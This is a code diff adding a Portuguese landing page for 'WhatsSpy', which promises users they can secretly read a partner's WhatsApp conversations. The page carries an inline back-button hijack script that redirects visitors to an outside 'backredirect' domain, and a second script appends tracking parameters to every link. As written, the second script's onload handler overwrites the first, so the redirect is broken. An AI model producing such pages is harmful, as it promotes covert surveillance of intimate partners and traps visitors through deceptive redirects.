@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsSpy - Inicio</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="css/index.css" />
+  </head>
+  <body>
+    <header class="header">
+      <img src="images/logo.webp" alt="WhatsSpy Logo" class="logo" />
+    </header>
+
+    <main class="main-content">
+      <div class="box">
+        <h1>Selecione quem você quer investigar:</h1>
+        <p>
+          A pessoa não tem como saber que você está vendo as conversas dela!
+        </p>
+        <a href="/pagina1/?pessoa=homem&" class="btn green">
+          Quero investigar meu parceiro
+          <span>( marido / namorado )</span>
+        </a>
+        <a href="/pagina1/?pessoa=mulher&" class="btn green">
+          Quero investigar minha parceira
+          <span>( esposa / namorada )</span>
+        </a>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <img src="images/logo.webp" alt="WhatsSpy Logo" class="footer-logo" />
+      <p>Termos de Uso - Políticas de Privacidade</p>
+      <p>WhatsSpy 2024 ©</p>
+    </footer>
+
+    <script src="js/script.js" defer=""></script>
+
+    <!-- Início do script para redirecionamento -->
+    <script>
+      function setupRedirect() {
+        // Quando o usuário acessa a pagina3.html, marcamos no localStorage
+        localStorage.setItem("accessedFinalPage", "true");
+
+        var urlBackRedirect = "https://appespiaopro.fun/backredirect";
+
+        // Formata a URL para redirecionamento
+        urlBackRedirect +=
+          (urlBackRedirect.indexOf("?") > 0 ? "&" : "?") +
+          document.location.search.replace("?", "");
+
+        // Adiciona uma entrada no histórico para manipulação
+        history.pushState({}, "", location.href);
+
+        // Função para redirecionar para a página de backredirect
+        function redirectToBack() {
+          location.href = urlBackRedirect;
+        }
+
+        // Detecta o uso do botão de voltar do navegador
+        window.onpopstate = redirectToBack;
+      }
+
+      // Executa a função ao carregar a página
+      window.onload = setupRedirect;
+    </script>
+    <!-- Fim do script para redirecionamento -->
+
+    <script>
+      window.onload = function () {
+        var links = document.getElementsByTagName("a");
+        for (var i = 0, n = links.length; i < n; i++) {
+          var href =
+            links[i].href.trim() +
+            (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+            document.location.search.replace("?", "").toString();
+          links[i].href = href;
+        }
+      };
+    </script>
+  </body>
+</html>
